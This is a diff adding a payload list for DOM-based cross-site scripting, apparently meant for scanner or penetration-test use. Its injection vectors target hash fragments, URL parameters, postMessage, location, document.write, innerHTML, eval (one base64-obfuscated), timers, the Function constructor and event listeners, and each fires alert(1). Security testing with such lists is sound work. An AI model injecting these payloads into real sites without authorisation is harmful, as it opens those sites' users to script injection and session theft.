@@ -1,0 +1,45 @@
+# DOM XSS specific payloads
+# Hash-based DOM XSS
+#<script>alert(1)</script>
+#<img src=x onerror=alert(1)>
+#<svg onload=alert(1)>
+
+# URL parameter manipulation
+?xss=<script>alert(1)</script>
+&xss=<script>alert(1)</script>
+
+# Fragment identifier
+#xss=<script>alert(1)</script>
+
+# PostMessage XSS
+<script>parent.postMessage("<img src=x onerror=alert(1)>","*")</script>
+
+# Location manipulation
+<script>location="javascript:alert(1)"</script>
+<script>location.href="javascript:alert(1)"</script>
+<script>location.replace("javascript:alert(1)")</script>
+
+# Document.write XSS
+<script>document.write("<img src=x onerror=alert(1)>")</script>
+<script>document.writeln("<svg onload=alert(1)>")</script>
+
+# innerHTML XSS
+<script>document.body.innerHTML="<img src=x onerror=alert(1)>"</script>
+<script>document.documentElement.innerHTML="<svg onload=alert(1)>"</script>
+
+# eval() XSS
+<script>eval("alert(1)")</script>
+<script>eval(atob("YWxlcnQoMSk="))</script>
+
+# setTimeout/setInterval XSS
+<script>setTimeout("alert(1)",1)</script>
+<script>setInterval("alert(1)",1)</script>
+<script>setTimeout(alert,1,1)</script>
+
+# Function constructor XSS
+<script>Function("alert(1)")()</script>
+<script>new Function("alert(1)")()</script>
+
+# Event-based DOM XSS
+<script>window.addEventListener("load",function(){alert(1)})</script>
+<script>document.addEventListener("DOMContentLoaded",function(){alert(1)})</script>
